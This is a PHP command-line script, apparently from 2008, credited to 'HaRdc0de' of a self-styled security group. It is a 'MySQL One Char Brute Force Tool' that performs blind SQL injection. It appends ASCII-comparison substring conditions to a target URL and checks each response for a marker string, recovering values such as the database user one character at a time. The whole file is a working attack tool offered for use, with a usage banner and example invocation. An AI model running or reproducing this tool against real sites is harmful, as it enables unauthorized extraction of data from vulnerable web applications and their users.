#!/usr/bin/php -q
<?php
/*****	

---//Coder: HaRdc0de a.k.a patrushka
 _           ____     _       ___      _ _____ 
| |__   __ _|  _ \ __| | ___ / _ \  __| |___ / 
| '_ \ / _` | |_) / _` |/ __| | | |/ _` | |_ \ 
| | | | (_| |  _ < (_| | (__| |_| | (_| |___) |
|_| |_|\__,_|_| \_\__,_|\___|\___/ \__,_|____/ 

---o  HardCodeRz Security Group | 2oo8 | http://hcrsg.helloweb.eu  o---

*****/

/** Main Part **/
if($_SERVER["argc"]<5){usage($argv[0]);}else{
$path=$argv[1];
$subquery=$argv[2];
$charnum=$argv[3];
$return_string=$argv[4];
$commit=$argv[5];
$min=$argv[6];
$max=$argv[7];


//controls of the min max ascii chars...
if($argv[6] == ""){$min=97;}  #97 is lowercase a
if($argv[7] == "" || $argv[7]>122){$max=122;} #122 is lowercase z

//control of the comment string...
if($commit==""){$commit="/*";}

usage($argv[0]);
echo "\n";
tryattack($path,$subquery,$charnum,$return_string,$min,$max,$commit);
}
/** Try Chars **/
function tryattack($path,$subquery,$charnum,$return_string,$min,$max,$commit){
$max=$max+1;

for($num=$min;$num<$max;$num++){

	if($commit=="'"){$numz="'".$num;}else{$numz=$num.$commit;}

$exp=urlencode(" AND ascii(lower(substring(".$subquery.",$charnum,1)))=".$numz);
$attackme=$path.$exp;
echo "Waiting for $num... \n";
if(attack($attackme,$return_string)){
echo "FOUND!! =)) Ascii: $num\nChar:".chr($num)."\n\n";
exit();
}else{
echo "NO =(\n\n";}
}

}

/** Attack **/
function attack($attackme,$return_string){
$fp=file_get_contents("$attackme");
if(preg_match("/$return_string/",$fp)){return 1;}
}

/** Usage Banner if args<4 **/
function usage($me){
echo "
 _           ____     _       ___      _ _____ 
| |__   __ _|  _ \ __| | ___ / _ \  __| |___ / 
| '_ \ / _` | |_) / _` |/ __| | | |/ _` | |_ \ 
| | | | (_| |  _ < (_| | (__| |_| | (_| |___) |
|_| |_|\__,_|_| \_\__,_|\___|\___/ \__,_|____/ 
                                              
";
echo "---// Coded by HaRdc0de a.k.a patrushka | HardCodeRz Security Group | 2oo8\n\n";
echo "--+ HCR MySQL One Char Brute Force Tool\n";
echo "--+ Use substring,ascii and lower method...\n";
echo "--+ Usage: $me [target] [subquery] [charnum] [return_string] [comment_string] [min_num] [max_num] \n";
echo "--+ Example: $me \"http://127.0.0.1/test.php?sql=1\" \"USER()\" 1 \"Hello World\" \"'\" 97 122 \n";
echo "--+ Help:\n";
echo "--+ If you select comment string as \"'\" it add it before the min/max ascii number. \n";
echo "--+ Example: ='97\n";
echo "--+ If you select comment string as \"/*\" it add it after the min/max ascii number... \n\n";
}


?>
